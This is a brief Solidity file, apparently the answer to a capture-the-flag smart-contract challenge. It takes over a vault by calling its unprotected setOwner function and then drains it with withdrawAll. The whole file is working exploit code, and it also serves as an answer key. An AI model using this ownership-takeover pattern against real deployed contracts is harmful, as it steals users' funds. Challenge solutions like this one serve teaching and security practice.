// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "./Challenge.sol";

contract Solution {
    function solve(Setup setup) external {
        AccessVault vault = setup.vault();

        vault.setOwner(address(this));

        vault.withdrawAll(payable(msg.sender));
    }
}